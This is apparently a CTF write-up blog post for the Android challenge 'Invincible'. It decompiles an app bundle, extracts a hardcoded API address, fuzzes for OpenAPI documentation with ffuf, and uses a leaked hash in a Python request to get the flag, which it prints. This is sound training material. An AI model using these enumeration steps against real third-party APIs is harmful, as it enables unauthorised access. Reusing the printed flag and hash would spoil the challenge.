---
title: Bitwall - Invincible
author: Bonface
date: 2025-05-05 00:00:00 +0000
categories:
  - CTF Competitions
tags:
  - Android
  - jadx-gui
  - Genymotion
  - api
image:
  path: /assets/img/CTF_Competitions/Bitwall/bitwall.png
  alt: invincible
---
# Challenge Overview
---
**Invincible** is an Android CTF challenge that involves analyzing a mobile app to uncover an exposed OpenAPI specification. This API documentation reveals both the structure of requests and a sensitive hash value. Our goal is to exploit this information to craft a valid API request and retrieve the flag.

# Enumeration

## Static Analysis
We are provided with an AAB file: `invincible.aab`.

An **AAB** (Android App Bundle) is a publishing format that contains all compiled code and resources for an Android app, but unlike APKs, it **is not directly installable** on devices.

To convert the `.aab` to an installable `.apk`, we use `bundletool`:
```bash
java -jar ~/tools/bundletool.jar build-apks \
  --bundle=invincible.aab \
  --output=invincible.apks \
  --mode=universal \
  --overwrite 
```

After generating the `.apks` file, we unzip it:
```bash
unzip invincible.apks
```

This gives us `universal.apk`, which we then decompile using `apktool` (we used `jadx` in the _Secure Chat Bounty_ challenge, so trying a different tool here):
```bash
apktool d universal.apk
cd universal/
```

Let’s check whether the app communicates with any external APIs by grepping for hardcoded URLs:
```bash
grep -Ri http:// .
```

Some matches are found inside binary files, so we use `strings` to extract readable content:
```bash
strings ./lib/x86_64/libapp.so | grep http://
```

This reveals:
```
http://34.207.249.121:8000/api/v1/
```

# Exploitation

Since we have access to an API root (`http://34.207.249.121:8000/api/v1/`), we try to brute-force common OpenAPI/Swagger documentation paths using `ffuf`.

We first create a `common-swagger-paths.txt` wordlist:

```
swagger
swagger.json
swagger-ui.html
api-docs
v1/swagger.json
api/swagger.json
api/openapi.json
openapi.json
docs
api/docs
openapi
redoc
```

Then we start fuzzing:
```bash
ffuf -u http://34.207.249.121:8000/FUZZ -w common-swagger-paths.txt -mc 200
```

The output:
```http
redoc                   [Status: 200]
openapi.json            [Status: 200]
docs                    [Status: 200]
```

The most interesting endpoint is `openapi.json`, which reveals the full OpenAPI schema:
```bash
curl -s http://34.207.249.121:8000/openapi.json | jq
```

We find this juicy bit:
```json
"/api/v1/invincible_path": {
  "get": {
    "description": "I'll make sure to remove this 70a9428d8aebe403692ecc4b4148e17bad0c4859 during production",
    "parameters": [
      {
        "name": "invincible_hash",
        "in": "query",
        "required": false,
        "schema": {
          "type": "string"
        }
      }
    ]
  }
}
```

From this, we know:
- The endpoint is `GET /api/v1/invincible_path`
- It accepts a `query` parameter: `invincible_hash`
- The developer accidentally leaked the expected hash in the description!

# Final Exploit

We use the hash value provided in the OpenAPI spec and craft the following Python script:
```python
import requests

url = "http://34.207.249.121:8000/api/v1/invincible_path"
params = {"invincible_hash": "70a9428d8aebe403692ecc4b4148e17bad0c4859"}

response = requests.get(url, params=params)
print(response.text)
```

Running it:
```bash
└─$ python3 invincible.py 
{"message":" {1n53cur3_1nv1n51bl3_4p1_6b09cef20deb76d89a3e00ba0a83de30}"}
```

**Flag:** `BitCTF{1n53cur3_1nv1n51bl3_4p1_6b09cef20deb76d89a3e00ba0a83de30}`
